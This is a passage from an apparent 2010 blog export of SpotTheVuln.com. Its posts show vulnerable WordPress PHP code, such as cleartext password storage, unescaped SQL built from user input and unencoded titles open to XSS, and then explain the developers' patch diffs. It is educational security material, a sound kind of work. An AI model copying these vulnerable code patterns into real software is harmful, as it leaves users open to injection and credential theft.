Original Code: <a title="Three Days" href="http://spotthevuln.com/2010/03/three-days/" target="_blank">Found Here</a>
<h2>Description</h2>
This change was a defense in depth fix for WordPress.  The code for this page comes from the user registration page.  Throughout the code we see handling for various pieces of information associated with the newly created user.  Looking through the code, we see some very fragile security code however this particular patch addressed the handling of passwords in the database.  In the vulnerable version of the code, the WordPress passes the newly created user password directly into the database.  If the WordPress install is ever compromised, the attacker will now have access to the clear text passwords for every user!

The WordPress developers strengthened the security mechanisms around password handling by hashing the password before storing it in the database. 

Although not fixed in this particular patch… if you look closely, there are other vulnerabilities in the user registration code :)
<h2>Developers Solution</h2>
[cce lang="diff"]

$user_login = $HTTP_POST_VARS['user_login'];

$pass1 = $HTTP_POST_VARS['pass1'];

$pass2 = $HTTP_POST_VARS['pass2'];

$user_email = $HTTP_POST_VARS['user_email'];

/* checking login has been typed */

if ($user_login == '') {

die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Please enter a login.');

}

/* checking the password has been typed twice */

if ($pass1 == '' || $pass2 == '') {

die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Please enter your password twice.');

}

/* checking the password has been typed twice the same */

if ($pass1 != $pass2) {

die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Please type the same password in the two password fields.');

}

$user_nickname = $user_login;

/* checking e-mail address */

if ($user_email == '') {

die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Please type your e-mail address.');

} else if (!is_email($user_email)) {

die ('&lt;strong&gt;ERROR&lt;/strong&gt;: The email address isn\'t correct.');

}

/* checking the login isn't already used by another user */

$result = $wpdb-&gt;get_results("SELECT user_login FROM $tableusers WHERE user_login = '$user_login'");

if (count($result) &gt;= 1) {

die ('&lt;strong&gt;ERROR&lt;/strong&gt;: This login is already registered, please choose another one.');

}

$user_ip = $HTTP_SERVER_VARS['REMOTE_ADDR'] ;

$user_domain = gethostbyaddr($HTTP_SERVER_VARS['REMOTE_ADDR'] );

$user_browser = $HTTP_SERVER_VARS['HTTP_USER_AGENT'];

$user_login = addslashes($user_login);

$pass1 = addslashes($pass1);

$user_nickname = addslashes($user_nickname);

$now = current_time('mysql');

$result = $wpdb-&gt;query("INSERT INTO $tableusers

(user_login, user_pass, user_nickname, user_email, user_ip, user_domain, user_browser, dateYMDhour, user_level, user_idmode)

VALUES

-('$user_login', '$pass1', '$user_nickname', '$user_email', '$user_ip', '$user_domain', '$user_browser', '$now', '$new_users_can_blog', 'nickname')");

+('$user_login', MD5('$pass1'), '$user_nickname', '$user_email', '$user_ip', '$user_domain', '$user_browser', '$now', '$new_users_can_blog', 'nickname')");

if ($result == false) {

die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Couldn\'t register you... please contact the &lt;a href="mailto:'.$admin_email.'"&gt;webmaster&lt;/a&gt; !');

}

$stars = '';

for ($i = 0; $i &lt; strlen($pass1); $i = $i + 1) {

$stars .= '*';

}

$message = "New user registration on your blog $blogname:\r\n\r\n";

$message .= "Login: $user_login\r\n\r\nE-mail: $user_email";

@mail($admin_email, "[$blogname] New User Registration", $message);

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>773</wp:post_id>
		<wp:post_date>2010-03-26 13:46:45</wp:post_date>
		<wp:post_date_gmt>2010-03-26 20:46:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>three-days-defense-in-depth</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[4fddda3267064b4acd373ec26e04922f]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aPcDxJ]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[4fddda3267064b4acd373ec26e04922f]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>433</wp:comment_id>
			<wp:comment_author><![CDATA[Nattl]]></wp:comment_author>
			<wp:comment_author_email>nattl@gmx.net</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>139.80.123.36</wp:comment_author_IP>
			<wp:comment_date>2010-03-26 17:47:09</wp:comment_date>
			<wp:comment_date_gmt>2010-03-27 00:47:09</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[1. When first checking for the existing login-name, $user_login is not masked by addslashes() whereas when entering the new registered user to the database, addslashes() is used. 

2. $stars (for whatever it is used) stores exactly the number of characters in the password.

Also is using addslashes() on $pass1 a good idea? Can it be guaranteed that the user-password will be always masked using addslashes (in other functions).]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>This weeks post will be on Wednesday</title>
		<link>http://spotthevuln.com/2010/03/this-weeks-post-will-be-on-wednesday/</link>
		<pubDate>Tue, 30 Mar 2010 13:22:56 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/2010/03/this-weeks-post-will-be-on-wednesday/</guid>
		<description></description>
		<content:encoded><![CDATA[Unfortunately, we have had some technical difficulties at STV and we will be posting this weeks code on Wednesday. Sorry for the late notice and any problems that arise from this.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>776</wp:post_id>
		<wp:post_date>2010-03-30 06:22:56</wp:post_date>
		<wp:post_date_gmt>2010-03-30 13:22:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>this-weeks-post-will-be-on-wednesday</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/91hDEj]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[cb8fa6ff089e6158538c72bb384cf8a1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>More Than One Night</title>
		<link>http://spotthevuln.com/2010/03/more-than-one-night/</link>
		<pubDate>Wed, 31 Mar 2010 15:00:23 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=777</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Sometimes I lie awake at night, and I ask, "Where have I gone wrong?"   </strong><strong>Then a voice says to me, "This is going to take more than one night.".</strong><strong>
- Charlie Brown
</strong></blockquote>
[ccnLe_php]

// Category stuff
if ((empty($q['cat'])) || ($q['cat'] == '0') ||
// Bypass cat checks if fetching specific posts
( $this-&gt;is_single || $this-&gt;is_page )) {
 $whichcat='';
 } else {
  $q['cat'] = ''.urldecode($q['cat']).'';
         $q['cat'] = addslashes_gpc($q['cat']);
         $join = " LEFT JOIN $wpdb-&gt;post2cat ON ($wpdb-&gt;posts.ID = $wpdb-&gt;post2cat.post_id) ";
         $cat_array = preg_split('/[,\s]+/', $q['cat']);
         $in_cats = $out_cats = '';
        
  foreach ( $cat_array as $cat ) {
          $in = strstr($cat, '-') ? false : true;
                 $cat = trim($cat, '-');
                
   if ( $in )
                  $in_cats .= "$cat, " . get_category_children($cat, '', ', ');
                 else
                  $out_cats .= "$cat, " . get_category_children($cat, '', ', ');                        
  }
        
  $in_cats = substr($in_cats, 0, -2);
         $out_cats = substr($out_cats, 0, -2);
        
  if ( strlen($in_cats) &gt; 0 )
          $in_cats = " AND category_id IN ($in_cats)";
                
   if ( strlen($out_cats) &gt; 0 )
                  $out_cats = " AND category_id NOT IN ($out_cats)";
                         $whichcat = $in_cats . $out_cats;
                         $distinct = 'DISTINCT';
 }
 

// Category stuff for nice URIs
 
global $cache_categories;
if ('' != $q['category_name']) {

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>777</wp:post_id>
		<wp:post_date>2010-03-31 08:00:23</wp:post_date>
		<wp:post_date_gmt>2010-03-31 15:00:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>more-than-one-night</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[b8218d2018ce195078dfb87ea8383fb4]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bPX7Vb]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>436</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; More Than One Night &#8211; Defense in Depth ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/04/more-than-one-night-defense-in-depth/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-04-02 08:09:54</wp:comment_date>
			<wp:comment_date_gmt>2010-04-02 15:09:54</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] More Than One Night [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>More Than One Night – Defense in Depth</title>
		<link>http://spotthevuln.com/2010/04/more-than-one-night-defense-in-depth/</link>
		<pubDate>Fri, 02 Apr 2010 15:00:46 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=782</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress

Fixed in Version: 2.1

Issue Type: Defense in Depth

Original Code: <a title="More than one night" href="http://spotthevuln.com/2010/03/more-than-one-night/" target="_blank">Found Here</a>
<h2>Description</h2>
I found this issue interesting for a couple reasons. Upon first glance, the patch appears to be a defense against SQL Injection and in essence, it is. It seems that the $q[‘cat’] value is controlled by the user and is eventually used to help build a SQL statement. Before the $q[‘cat’] value is used in a SQL statement, it is actually sanitized by the following lines:
<blockquote>$q['cat'] = ''.urldecode($q['cat']).'';

$q['cat'] = addslashes_gpc($q['cat']);</blockquote>
Once the value is sanitized, it is used to build various SQL statements. Now this particular patch was developed by the WordPress team because they discovered that when a user/attacker passes a “.” (period character) to $q[‘cat’], it would cause a SQL error which would be displayed to the user. While a single period character doesn’t give the attacker the ability to execute arbitrary SQL, it does give the attacker an information disclosure bug. In an academic sense however, the attacker has convinced the database that their provided value should be interpreted as code as opposed to data (ala SQL Injection). The reason the period character slips through is because it is not defined as a special character in the addslashes() php function… this could be useful in other situations.

The WordPress prevented the information leak by checking to see if $q[‘cat’] is an integer value. The patch here is a single line fix.
<h2>Developers Solution</h2>
[cce lang="diff"]

// Category stuff

if ((empty($q['cat'])) || ($q['cat'] == '0') ||

// Bypass cat checks if fetching specific posts

( $this-&gt;is_single || $this-&gt;is_page )) {

$whichcat='';

} else {

$q['cat'] = ''.urldecode($q['cat']).'';

$q['cat'] = addslashes_gpc($q['cat']);

$join = " LEFT JOIN $wpdb-&gt;post2cat ON ($wpdb-&gt;posts.ID = $wpdb-&gt;post2cat.post_id) ";

$cat_array = preg_split('/[,\s]+/', $q['cat']);

$in_cats = $out_cats = '';

foreach ( $cat_array as $cat ) {

+ $cat = intval($cat);

$in = strstr($cat, '-') ? false : true;

$cat = trim($cat, '-');

if ( $in )

$in_cats .= "$cat, " . get_category_children($cat, '', ', ');

else

$out_cats .= "$cat, " . get_category_children($cat, '', ', ');

}

$in_cats = substr($in_cats, 0, -2);

$out_cats = substr($out_cats, 0, -2);

if ( strlen($in_cats) &gt; 0 )

$in_cats = " AND category_id IN ($in_cats)";

if ( strlen($out_cats) &gt; 0 )

$out_cats = " AND category_id NOT IN ($out_cats)";

$whichcat = $in_cats . $out_cats;

$distinct = 'DISTINCT';

}

// Category stuff for nice URIs

global $cache_categories;

if ('' != $q['category_name']) {

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>782</wp:post_id>
		<wp:post_date>2010-04-02 08:00:46</wp:post_date>
		<wp:post_date_gmt>2010-04-02 15:00:46</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>more-than-one-night-defense-in-depth</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="addslashes"><![CDATA[addslashes]]></category>
		<category domain="category" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="post_tag" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="post_tag" nicename="information-disclosure"><![CDATA[information disclosure]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aw0TgH]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[771052054598c247d72650ac5c5b23ad]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[More Than One Night - Defense in Depth]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[More Than One Night - Defense in Depth]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Working Clothes</title>
		<link>http://spotthevuln.com/2010/04/working-clothes/</link>
		<pubDate>Mon, 05 Apr 2010 15:00:27 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=785</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Common sense is genius dressed in its working clothes.</strong>

<strong>- Ralph Waldo Emerson</strong></blockquote>
[ccnLe_php]

&lt;?php

function wp_dashboard_recent_drafts( $drafts = false ) {
        if ( !$drafts ) {
                $drafts_query = new WP_Query( array(
                        'post_type' =&gt; 'post',
                        'post_status' =&gt; 'draft',
                        'author' =&gt; $GLOBALS['current_user']-&gt;ID,
                        'posts_per_page' =&gt; 5,
                        'orderby' =&gt; 'modified',
                        'order' =&gt; 'DESC'
                ) );
                $drafts =&amp; $drafts_query-&gt;posts;
        }
 
        if ( $drafts &amp;&amp; is_array( $drafts ) ) {
                $list = array();
                foreach ( $drafts as $draft ) {
                        $url = get_edit_post_link( $draft-&gt;ID );
                        $title = _draft_or_post_title( $draft-&gt;ID );
                        $item = "&lt;h4&gt;&lt;a href='$url' title='" . sprintf( __( 'Edit &amp;#8220;%s&amp;#8221;' ), esc_attr( $title ) ) . "'&gt;$title&lt;/a&gt; &lt;abbr title='" . get_the_time(__('Y/m/d g:i:s A'), $draft) . "'&gt;" . get_the_time( get_option( 'date_format' ), $draft ) . '&lt;/abbr&gt;&lt;/h4&gt;';
                        if ( $the_content = preg_split( '#\s#', strip_tags( $draft-&gt;post_content ), 11, PREG_SPLIT_NO_EMPTY ) )
                                $item .= '&lt;p&gt;' . join( ' ', array_slice( $the_content, 0, 10 ) ) . ( 10 &lt; count( $the_content ) ? '&amp;hellip;' : '' ) . '&lt;/p&gt;';
                        $list[] = $item;
                }
?&gt;
        &lt;ul&gt;
                &lt;li&gt;&lt;?php echo join( "&lt;/li&gt;\n&lt;li&gt;", $list ); ?&gt;&lt;/li&gt;
        &lt;/ul&gt;
        &lt;p&gt;&lt;a href="edit.php?post_status=draft"&gt;&lt;?php _e('View all'); ?&gt;&lt;/a&gt;&lt;/p&gt;
&lt;?php
        } else {
                _e('There are no drafts at the moment');
        }
}
 
/**
 * Display recent comments dashboard widget content.
 *
 * @since unknown
 */
function wp_dashboard_recent_comments() {
        global $wpdb;
 
        if ( current_user_can('edit_posts') )
                $allowed_states = array('0', '1');
        else
                $allowed_states = array('1');
 
        // Select all comment types and filter out spam later for better query performance.
        $comments = array();
        $start = 0;
 
        while ( count( $comments ) &lt; 5 &amp;&amp; $possible = $wpdb-&gt;get_results( "SELECT * FROM $wpdb-&gt;comments c LEFT JOIN $wpdb-&gt;posts p ON c.comment_post_ID = p.ID WHERE p.post_status != 'trash' ORDER BY c.comment_date_gmt DESC LIMIT $start, 50" ) ) {
 
                foreach ( $possible as $comment ) {
                        if ( count( $comments ) &gt;= 5 )
                                break;
                        if ( in_array( $comment-&gt;comment_approved, $allowed_states ) )
                                $comments[] = $comment;
                }
 
                $start = $start + 50;
        }
 
        if ( $comments ) :
?&gt;
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>785</wp:post_id>
		<wp:post_date>2010-04-05 08:00:27</wp:post_date>
		<wp:post_date_gmt>2010-04-05 15:00:27</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>working-clothes</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[0edf3c5a47968f52445d5d7950db59b9]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dD7IvS]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Working Clothes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Working Clothes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>444</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Working Clothes &#8211; XSS ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/04/working-clothes-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-04-09 08:59:28</wp:comment_date>
			<wp:comment_date_gmt>2010-04-09 15:59:28</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Working Clothes [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Working Clothes – XSS</title>
		<link>http://spotthevuln.com/2010/04/working-clothes-xss/</link>
		<pubDate>Fri, 09 Apr 2010 15:59:22 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=790</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress

Fixed in Version: 2.9

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Working Clothes" href="http://spotthevuln.com/2010/04/working-clothes/" target="_blank">Found Here</a>
<h2>Description</h2>
Another classic XSS vulnerability in WordPress. This particular vulnerability was fixed in WordPress version 2.9. In this fix, the WordPress developers realized that they had not provided any sanitization or encoding for the $title variable. What's interesting is although the WordPress developers missed a HTML encode, they managed to attribute escape same variable literally a few characters away in the same line of code! The WordPress developers simply called an HTML escape function to defend against XSS attacks. Its a simple one line change which is provided below.
<h2>Developers Solution</h2>
[cce lang="diff"]

function wp_dashboard_recent_drafts( $drafts = false ) {
        if ( !$drafts ) {
                $drafts_query = new WP_Query( array(
                        'post_type' =&gt; 'post',
                        'post_status' =&gt; 'draft',
                        'author' =&gt; $GLOBALS['current_user']-&gt;ID,
                        'posts_per_page' =&gt; 5,
                        'orderby' =&gt; 'modified',
                        'order' =&gt; 'DESC'
                ) );
                $drafts =&amp; $drafts_query-&gt;posts;
        }
 
        if ( $drafts &amp;&amp; is_array( $drafts ) ) {
                $list = array();
                foreach ( $drafts as $draft ) {
                        $url = get_edit_post_link( $draft-&gt;ID );
                        $title = _draft_or_post_title( $draft-&gt;ID );
-                       $item = "&lt;h4&gt;&lt;a href='$url' title='" . sprintf( __( 'Edit &amp;#8220;%s&amp;#8221;' ), esc_attr( $title ) ) . "'&gt;$title&lt;/a&gt; &lt;abbr title='" . get_the_time(__('Y/m/d g:i:s A'), $draft) . "'&gt;" . get_the_time( get_option( 'date_format' ), $draft ) . '&lt;/abbr&gt;&lt;/h4&gt;';
